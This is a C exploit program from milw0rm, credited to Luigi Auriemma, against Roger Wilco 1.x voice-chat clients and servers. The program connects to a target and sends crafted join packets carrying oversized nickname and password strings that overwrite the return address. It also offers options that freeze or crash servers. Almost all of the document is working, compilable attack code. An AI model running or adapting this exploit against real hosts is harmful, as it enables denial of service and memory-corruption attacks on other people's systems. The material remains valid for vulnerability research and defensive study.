<html><head><title>Roger Wilco 1.x Client Data Buffer Overflow Exploit</title></head><pre>/*

by Luigi Auriemma

Use -DWIN to compile it on Windows

UNIX &amp; WIN VERSION

*/

#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;

#ifdef WIN
#include &lt;winsock.h&gt;
#include &quot;winerr.h&quot;

#define close closesocket
#else
#include &lt;unistd.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;arpa/inet.h&gt;
#include &lt;netdb.h&gt;
#endif


#define VER &quot;0.2&quot;
#define PORT 3782
#define UDPORT 32230
#define BUFFSZ 4096
#define TIMEOUT 5
#define CHANNEL &quot;channel&quot;

/* 516 bytes */
#define BOFNICK \
&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot; \
&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot; \
&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot; \
&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot; \
&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot; \
&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot; \
&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot; \
&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot; \
&quot;AAAA&quot; /* EIP */

/* 33 bytes */
#define BOF2 &quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot;

/* 1022 bytes */
#define BOF3 \
&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot; \
&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot; \
&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot; \
&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot; \
&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot; \
&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot; \
&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot; \
&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot; \
&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot; \
&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot; \
&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot; \
&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot; \
&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot; \
&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot; \
&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot; \
&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot; \
&quot;AAAA&quot; /* EIP */

/* 1268 bytes */
#define PWDBOF \
&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot; \
&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot; \
&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot; \
&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot; \
&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot; \
&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot; \
&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot; \
&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot; \
&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot; \
&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot; \
&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot; \
&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot; \
&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot; \
&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot; \
&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot; \
&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot; \
&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot; \
&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot; \
&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot; \
&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot; \
&quot;AAAA&quot; /* EIP */

void rw_manage(int sock, u_char *ptr, int len);
void info_udp(char *hostname, u_short port);
void timeout(int sock);
u_char *create_pck(char *channel, char *password, char *nick, u_short *pcklen);
void show_dump(unsigned char *buff, unsigned int buffsz);
void showinfostring(unsigned char *buff, int size);
u_long resolv(char *host);
void std_err(void);

u_char bug = 0,
next = 0; /* 0 = tag, 1 = size, 2 = data */
u_short type = 0,
size = 0;

int main(int argc, char *argv[]) {
u_char *buff = 0,
*pcksend = 0,
info = 0,
autorejoin = 0;
char *channel = CHANNEL,
*nick = &quot;&quot;,
*password = 0;
struct sockaddr_in peer;
int sd,
err,
i,
len;
u_short pcklen,
port = PORT;

setbuf(stdout, NULL);

fputs(&quot;\n&quot;
&quot;Testing tool for RogerWilco &quot;VER&quot;\n&quot;
&quot;by Luigi Auriemma\n&quot;
&quot;e-mail: aluigi@pivx.com\n&quot;
&quot;web: http://aluigi.altervista.org\n&quot;
&quot;\n&quot;, stdout);


if(argc &lt; 2) {
printf(&quot;\nUsage: %s [bugs] [options] &lt;host&gt;\n&quot;
&quot;\nBugs:\n&quot;
&quot;-1 Remote broadcast BoF in versions 2001 and BoF in 1.4.1.6 (*)\n&quot;
&quot;-2 DoS to freeze servers, versions 2001 and 1.4.1.6 (*)\n&quot;
&quot;-3 Server crash in version 1.4.1.6 (*)\n&quot;
&quot;-4 Buffer-overflow in versions 2001, 1.4.1.2 and 1.4.1.6(*)\n&quot;
&quot;-5 Server's buffer-overflow versus ALL the graphical clients included\n&quot;
&quot; the 1.4.1.6 ver and ALL the dedicated servers included the 0.30a\n&quot;
&quot; version. This bug affets EVERY server also if you don't know its\n&quot;
&quot; password (you must not set the channel to overwrite the return\n&quot;
&quot; address with my default value AAAA)\n&quot;
&quot;Options:\n&quot;
&quot;-n NICK Chose your nickname (default invisible mode)\n&quot;
&quot;-c CHAN Chose the channel to join (default \&quot;&quot;CHANNEL&quot;\&quot;)\n&quot;
&quot;-w PASS Chose the password for joining the chat (default none)\n&quot;
&quot;-p PORT Server port to connect to (default 3782) (default info-port 32230)\n&quot;
&quot;-a Autorejoin immediately if kicked\n&quot;
&quot;-i Retrieve info from the remote server using UDP (if not hidden)\n&quot;
&quot;\n\n&quot;
&quot;(*) These bugs affect the graphical server (not the dedicated server) and if\n&quot;
&quot; the server is dedicated, all the clients connected are vulnerable\n&quot;
&quot; This exploit, without using any of these bugs'options, runs like a sniffer\n&quot;
&quot; and shows you some useful informations\n&quot;
&quot;\n&quot;, argv[0]);
exit(1);
}


argc--;
for(i = 1; i &lt; argc; i++) {
switch(argv[i][1]) {
case '1':
case '2':
case '3':
case '4':
case '5': bug = argv[i][1] - 0x30; break;
case 'n': nick = argv[++i]; break;
case 'c': channel = argv[++i]; break;
case 'w': password = argv[++i]; break;
case 'p': port = atoi(argv[++i]); break;
case 'a': autorejoin = 1; break;
case 'i': info = 1; break;
default: {
printf(&quot;\nError: wrong argument (%s)\n&quot;, argv[i]);
exit(1);
}
}
}

#ifdef WIN
WSADATA wsadata;
WSAStartup(MAKEWORD(1,0), &amp;wsadata);
#endif

if(info) {
if(port == PORT) port = UDPORT;
info_udp(argv[argc], port);
return(0);
}

printf(&quot;\n&quot;
&quot;Nickname: %s\n&quot;
&quot;Channel: %s\n&quot;
&quot;\n&quot;, nick, channel);

peer.sin_addr.s_addr = resolv(argv[argc]);
peer.sin_port = htons(port);
peer.sin_family = AF_INET;

buff = malloc(BUFFSZ + 1);
if(!buff) std_err();


/* AUTOREJOIN */
while(1) {

sd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
if(sd &lt; 0) std_err();


printf(&quot;\nConnecting to %s:%hu\n&quot;,
inet_ntoa(peer.sin_addr),
htons(peer.sin_port));

err = connect(sd, (struct sockaddr *)&amp;peer, sizeof(peer));
if(err &lt; 0) std_err();


/* BUG 5 */
if(bug == 5) password = PWDBOF;

pcksend = create_pck(channel, password, nick, &amp;pcklen);
err = send(sd, pcksend, pcklen, 0);
if(err &lt; 0) std_err();

next = 0;
while(1) {
len = recv(sd, buff, BUFFSZ, 0);
if(len &lt; 0) std_err();
if(!len) {
fputs(&quot;\nError: Connection lost\n&quot;, stdout);
break;
}

rw_manage(sd, buff, len);
}

close(sd);

if(!autorejoin) break;
}

return(0);
}

void rw_manage(int sock, u_char *ptr, int len) {
int err;
u_long ip;
u_short port;


while(len &gt; 0) { /* while */

switch(next) {
/* 0 */ case 0: {
type = *(u_short *)ptr;
next = 0;
switch(type) {
case 0x030f: {
fputs(&quot;You have been kicked out\n&quot;, stdout);
} break;
case 0x060f: {
fputs(&quot;The channel you want to join doesn't exist!\n&quot;, stdout);
} break;
case 0x070f: {
fputs(&quot;The channel requires a password or your password is wrong\n&quot;, stdout);
} break;
case 0x140f: {
err = send(sock, &quot;\x0f\x14&quot;, 2, 0);
if(err &lt; 0) std_err();
} break;
case 0x150f: {
err = send(sock, &quot;\x0f\x15&quot;, 2, 0);
if(err &lt; 0) std_err();
} break;
default: next = 1; break;
}
ptr += 2;
len -= 2;
} break; 
/* 1 */ case 1: {
size = htons(*(u_short *)ptr);
next = 2;
ptr += 2;
len -= 2;
} break;
/* 2 */ case 2: {
switch(type) {
case 0x020f: {
printf(&quot;You have ID %hu\n&quot;, htons(*(u_short *)ptr));
} break;
case 0x0a0f: {
printf(&quot;User with ID %hu is entered\n&quot;, htons(*(u_short *)ptr));
} break;
case 0x0b0f: {
printf(&quot;User with ID %hu is exited\n&quot;, htons(*(u_short *)ptr));
} break;
case 0x0c0f: {
err = size - 2;
printf(&quot;User with ID %hu has name: &quot;, htons(*(u_short *)ptr));
fwrite(ptr + 2, err, 1, stdout);
fputc('\n', stdout);
} break;
case 0x0d0f:
case 0x0e0f: {
/* BOH???
printf(&quot;%hu - %d\n&quot;,
htons(*(u_short *)ptr), htonl(*(u_long *)(ptr + 2)));
*/
} break;
case 0x0f0f: {
ip = *(u_long *)(ptr + 2);
port = *(u_short *)(ptr + 6);
printf(&quot;Address of user with ID %hu is %s:%hu\n&quot;,
htons(*(u_short *)ptr),
inet_ntoa(*(struct in_addr *)&amp;ip),
htons(port));
} break;
default: {
printf(&quot;--&gt; Undefined type: %04x (hex dump follows)\n&quot;, type);
show_dump(ptr, size);
} break;
}
next = 0;
ptr += size;
len -= size;
} break;
}

} /* while */
}

void info_udp(char *hostname, u_short port) {
struct sockaddr_in peer;
int sd,
err,
peerlen;
u_char *buff;

peer.sin_addr.s_addr = resolv(hostname);
peer.sin_port = htons(port);
peer.sin_family = AF_INET;
peerlen = sizeof(peer);

printf(&quot;\nRetrieve information from: %s:%d\n\n&quot;,
inet_ntoa(peer.sin_addr), port);


sd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
if(sd &lt; 0) std_err();


err = sendto(sd, &quot;\\status\\&quot;, 8, 0, (struct sockaddr *)&amp;peer, peerlen);
if(err &lt; 0) std_err();

timeout(sd);


buff = malloc(BUFFSZ + 1);
if(!buff) std_err();

err = recvfrom(sd, buff, BUFFSZ, 0, (struct sockaddr *)&amp;peer, &amp;peerlen);
if(err &lt; 0) std_err();
buff[err] = 0x00;

showinfostring(buff, err);

close(sd);
free(buff);
}

u_char *create_pck(char *channel, char *password, char *nick, u_short *pcklen) {
static u_char *buff;
u_char *ptr;
u_short len,
tmp,
pwlen = 0,
chlen,
nicklen;

buff = malloc(BUFFSZ);
if(!buff) std_err();

ptr = buff;

chlen = strlen(channel) + 1;
if(password) pwlen = strlen(password);

len = chlen + pwlen + 12;
tmp = htons(len);

memcpy(ptr, &quot;\x0f\x00&quot;, 2);
ptr += 2;
memcpy(ptr, &amp;tmp, 2);
ptr += 2;

/* I dunno what the following 12 bytes are, but they work fine */
memcpy(ptr, &quot;\x6A\xD6\x4C\x03\x96\xED\x3B\xE7\x88\xE2\xA9\x74&quot;, 12);
ptr += 12;
memcpy(ptr, channel, chlen);
ptr += chlen;

if(password) {
memcpy(ptr, password, pwlen);
ptr += pwlen;
}

memcpy(ptr, &quot;\x0F\x10&quot;, 2);
ptr += 2;

switch(bug) {
case 1: nick = BOFNICK; break;
case 2: {
*pcklen = ptr - buff;
return(buff);
} break;
case 3: nick = BOF2; break;
case 4: nick = BOF3; break;
default: break;
}

nicklen = strlen(nick);
tmp = htons(nicklen);
memcpy(ptr, &amp;tmp, 2);
ptr += 2;
memcpy(ptr, nick, nicklen);
ptr += nicklen;

memcpy(ptr,
&quot;\x0F\x11&quot;
&quot;\x00\x04&quot; &quot;\x00\x00\x00\x02&quot;
&quot;\x0F\x12&quot;
&quot;\x00\x04&quot; &quot;\x00\x00\x00\x00&quot;, 16);

*pcklen = ptr - buff + 16;

return(buff);
}

void show_dump(unsigned char *buff, unsigned int buffsz) {
const char *hex = &quot;0123456789abcdef&quot;;
unsigned char buffout[80],
*ptrout,
*ptr;
unsigned int num;
int i,
j,
rest;

num = buffsz &gt;&gt; 4; /* 16 caratteri */
rest = (buffsz - (num &lt;&lt; 4));
ptr = buff;


for(i = 0; i &lt; num; i++) {
ptrout = buffout;
for(j = 0; j &lt; 16; j++) {
*ptrout++ = hex[*ptr &gt;&gt; 4];
*ptrout++ = hex[*ptr &amp; 0xf];
*ptrout++ = 0x20;
*ptr++;
}
*ptrout++ = 0x20;
*ptrout++ = 0x20;

ptr -= 16;
for(j = 0; j &lt; 16; j++) {
if(*ptr &gt; 0x20) *ptrout = *ptr;
else *ptrout = '.';
ptr++;
ptrout++;
}
*ptrout++ = 0x0a;
*ptrout = 0x00;
fputs(buffout, stdout);
}

if(rest) {
ptrout = buffout;
for(j = 0; j &lt; rest; j++) {
*ptrout++ = hex[*ptr &gt;&gt; 4];
*ptrout++ = hex[*ptr &amp; 0xf];
*ptrout++ = 0x20;
*ptr++;
}

j = 50 - (ptrout - buffout);
memset(ptrout, 0x20, j);
ptrout += j;

ptr -= rest;
for(j = 0; j &lt; rest; j++) {
if(*ptr &gt; 0x20) *ptrout = *ptr;
else *ptrout = '.';
ptr++;
ptrout++;
}
*ptrout++ = 0x0a;
*ptrout = 0x00;
fputs(buffout, stdout);
}
}

u_long resolv(char *host) {
struct hostent *hp;
u_long host_ip;

host_ip = inet_addr(host);
if(host_ip == INADDR_NONE) {
hp = gethostbyname(host);
if(!hp) {
printf(&quot;\nError: Unable to resolve hostname (%s)\n&quot;,
host);
exit(1);
} else host_ip = *(u_long *)(hp-&gt;h_addr);
}

return(host_ip);
}

void timeout(int sock) {
struct timeval timeout;
fd_set fd_read;
int err;


timeout.tv_sec = TIMEOUT;
timeout.tv_usec = 0;

FD_ZERO(&amp;fd_read);
FD_SET(sock, &amp;fd_read);
err = select(sock + 1, &amp;fd_read, NULL, NULL, &amp;timeout);
if(err &lt; 0) std_err();
if(!err) {
fputs(&quot;\nError: Socket timeout, no answers received\n&quot;, stdout);
exit(1);
}
}

void showinfostring(unsigned char *buff, int size) {
int nt = 1;
// int len;
u_char *string;


// len = strlen(buff);
// if(len &lt; size) buff += len + 1;

while(1) {
string = strchr(buff, '\\');
if(!string) break;

*string = 0x00;


/* \n or \t */
if(!nt) {
printf(&quot;%s: &quot;, buff);
nt++;
} else {
printf(&quot;%s\n&quot;, buff);
nt = 0;
}


buff = string + 1;
}

printf(&quot;%s\n\n&quot;, buff);
}

#ifndef WIN
void std_err(void) {
perror(&quot;\nError&quot;);
exit(1);
}
#endif

------------------------------ winerr.h ------------------------------
/*
Header file used for manage errors in Windows
It support socket and errno too
(this header replace the previous sock_errX.h)
*/

#include &lt;string.h&gt;
#include &lt;errno.h&gt;



void std_err(void) {
char *error;

switch(WSAGetLastError()) {
case 10004: error = &quot;Interrupted system call&quot;; break;
case 10009: error = &quot;Bad file number&quot;; break;
case 10013: error = &quot;Permission denied&quot;; break;
case 10014: error = &quot;Bad address&quot;; break;
case 10022: error = &quot;Invalid argument (not bind)&quot;; break;
case 10024: error = &quot;Too many open files&quot;; break;
case 10035: error = &quot;Operation would block&quot;; break;
case 10036: error = &quot;Operation now in progress&quot;; break;
case 10037: error = &quot;Operation already in progress&quot;; break;
case 10038: error = &quot;Socket operation on non-socket&quot;; break;
case 10039: error = &quot;Destination address required&quot;; break;
case 10040: error = &quot;Message too long&quot;; break;
case 10041: error = &quot;Protocol wrong type for socket&quot;; break;
case 10042: error = &quot;Bad protocol option&quot;; break;
case 10043: error = &quot;Protocol not supported&quot;; break;
case 10044: error = &quot;Socket type not supported&quot;; break;
case 10045: error = &quot;Operation not supported on socket&quot;; break;
case 10046: error = &quot;Protocol family not supported&quot;; break;
case 10047: error = &quot;Address family not supported by protocol family&quot;; break;
case 10048: error = &quot;Address already in use&quot;; break;
case 10049: error = &quot;Can't assign requested address&quot;; break;
case 10050: error = &quot;Network is down&quot;; break;
case 10051: error = &quot;Network is unreachable&quot;; break;
case 10052: error = &quot;Net dropped connection or reset&quot;; break;
case 10053: error = &quot;Software caused connection abort&quot;; break;
case 10054: error = &quot;Connection reset by peer&quot;; break;
case 10055: error = &quot;No buffer space available&quot;; break;
case 10056: error = &quot;Socket is already connected&quot;; break;
case 10057: error = &quot;Socket is not connected&quot;; break;
case 10058: error = &quot;Can't send after socket shutdown&quot;; break;
case 10059: error = &quot;Too many references, can't splice&quot;; break;
case 10060: error = &quot;Connection timed out&quot;; break;
case 10061: error = &quot;Connection refused&quot;; break;
case 10062: error = &quot;Too many levels of symbolic links&quot;; break;
case 10063: error = &quot;File name too long&quot;; break;
case 10064: error = &quot;Host is down&quot;; break;
case 10065: error = &quot;No Route to Host&quot;; break;
case 10066: error = &quot;Directory not empty&quot;; break;
case 10067: error = &quot;Too many processes&quot;; break;
case 10068: error = &quot;Too many users&quot;; break;
case 10069: error = &quot;Disc Quota Exceeded&quot;; break;
case 10070: error = &quot;Stale NFS file handle&quot;; break;
case 10091: error = &quot;Network SubSystem is unavailable&quot;; break;
case 10092: error = &quot;WINSOCK DLL Version out of range&quot;; break;
case 10093: error = &quot;Successful WSASTARTUP not yet performed&quot;; break;
case 10071: error = &quot;Too many levels of remote in path&quot;; break;
case 11001: error = &quot;Host not found&quot;; break;
case 11002: error = &quot;Non-Authoritative Host not found&quot;; break;
case 11003: error = &quot;Non-Recoverable errors: FORMERR, REFUSED, NOTIMP&quot;; break;
case 11004: error = &quot;Valid name, no data record of requested type&quot;; break;
default: error = strerror(errno); break;
}
fprintf(stderr, &quot;\nError: %s\n&quot;, error);
exit(1);
}

// milw0rm.com [2003-09-10]</pre></html>